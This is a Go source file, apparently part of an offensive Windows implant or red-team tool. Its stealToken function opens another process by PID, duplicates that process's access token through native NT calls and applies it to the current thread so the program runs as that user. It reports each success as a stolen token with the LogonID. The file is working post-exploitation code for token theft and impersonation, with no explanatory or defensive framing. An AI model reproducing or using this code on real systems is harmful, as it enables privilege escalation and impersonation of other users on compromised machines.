package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

type SECURITY_QUALITY_OF_SERVICE struct {
    Length              uint32
    ImpersonationLevel  uint32 // SECURITY_IMPERSONATION_LEVEL
    ContextTrackingMode byte
    EffectiveOnly       byte
    pad                 uint16 // padding for alignment
}

type OBJECT_ATTRIBUTES2 struct {
    Length                   uint32
    RootDirectory            uintptr
    ObjectName               uintptr
    Attributes               uint32
    SecurityDescriptor       uintptr
    SecurityQualityOfService uintptr
}



func stealToken(pid uint32) ([]byte, error) {
	var results string
	if pid <= 0 {
		results = fmt.Sprintf("invalid Process ID (PID) of %d", pid)
		return []byte(results), nil
	}

	handle, err := NtOpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		results = fmt.Sprintf("there was an error calling kernel32!OpenProcess: %s", err)
		return []byte(results), err
	}

	// Defer closing the process handle
	defer func() {
		err = windows.Close(handle)
		if err != nil {
			results += fmt.Sprintf("\n%s", err)
			return
		}
	}()

	// Use the process handle to get its access token

	// These token privs are required to call CreateProcessWithToken or later
	DesiredAccess := windows.TOKEN_DUPLICATE | windows.TOKEN_ASSIGN_PRIMARY | windows.TOKEN_QUERY | windows.TOKEN_IMPERSONATE
	//windows.ImpersonateSelf(windows.SecurityImpersonation)

	var token windows.Token
	err = NtOpenProcessToken(handle, uint32(DesiredAccess), &token)
	if err != nil {
		results = fmt.Sprintf("there was an error calling advapi32!OpenProcessToken: %s", err)
		return []byte(results), err
	}

	// Duplicate the token with maximum permissions
	var dupToken windows.Token
	sqos := windows.SECURITY_QUALITY_OF_SERVICE{
        Length:              uint32(unsafe.Sizeof(SECURITY_QUALITY_OF_SERVICE{})),
        ImpersonationLevel:  windows.SecurityImpersonation, // windows.SecurityImpersonation or windows.SecurityDelegation
        ContextTrackingMode: 0,
        EffectiveOnly:       0,
    }

    objAttr := windows.OBJECT_ATTRIBUTES{
        Length:                   uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{})),
        SecurityQoS: &sqos,
    }
	err = NtDuplicateToken(token, 0,  &objAttr, 0, windows.TokenImpersonation, &dupToken)
	if err != nil {
		results = fmt.Sprintf("there was an error calling windows.DuplicateTokenEx: %s", err)
		return []byte(results), err
	}

	// Get Thread Token TOKEN_STATISTICS structure
	statThread, err := GetTokenStats(dupToken)
	if err != nil {
		//return []byte(results), err
	}


	// Get Thread Username
	userThread, err := GetTokenUsername(dupToken)
	if err != nil {
		results = err.Error()
		//return []byte(results), err
	}

	err = ApplyToken(dupToken)
	if err != nil {
		results = err.Error()
		return []byte(results), err
	}

	results = fmt.Sprintf("Successfully stole token from PID %d for user %s with LogonID 0x%X", pid, userThread, statThread.AuthenticationId.LowPart)
	return []byte(results), err
}
